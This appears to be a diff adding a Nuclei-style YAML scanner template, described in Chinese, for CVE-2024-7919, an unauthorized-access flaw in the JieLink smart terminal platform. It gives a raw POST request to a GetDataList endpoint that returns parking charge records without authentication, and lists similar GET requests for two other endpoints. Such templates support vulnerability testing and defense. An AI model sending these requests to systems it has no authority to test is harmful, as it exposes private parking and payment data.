@@ -1,0 +1,40 @@
+id: jielink-platform-getdatalist-info-leak
+
+info:
+  name: "JieLink 智能终端操作平台 GetDataList 接口未授权访问漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    JieLink 智能终端操作平台在 /report/ParkChargeRecord/GetDataList 接口实现中存在权限校验缺失问题，攻击者可通过构造特定请求获取非授权数据访问权限。
+
+    具体影响包括：
+    1. /Report/ParkCommon/GetParkInThroughDeivces 接口未授权访问可能导致设备管理数据泄露
+    2. /report/ParkOutRecord/GetDataList 接口存在相似权限验证缺陷
+
+    攻击者可通过以下方式实施攻击：
+    GET /Report/ParkCommon/GetParkInThroughDeivces HTTP/1.1
+    GET /report/ParkOutRecord/GetDataList HTTP/1.1
+
+    该漏洞可能引发数据库记录篡改风险，包含但不限于新增/删除/修改操作，最终导致数据完整性破坏或敏感信息非授权暴露。漏洞披露日期为 2024-08-29
+  reference:
+  - CVE-2024-7919
+  tags: JieLink
+
+http:
+- raw:
+  - |
+    POST /report/ParkChargeRecord/GetDataList HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    X-Requested-With: XMLHttpRequest
+    Connection: close
+
+    page=1&rows=10
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'PayTypeName'
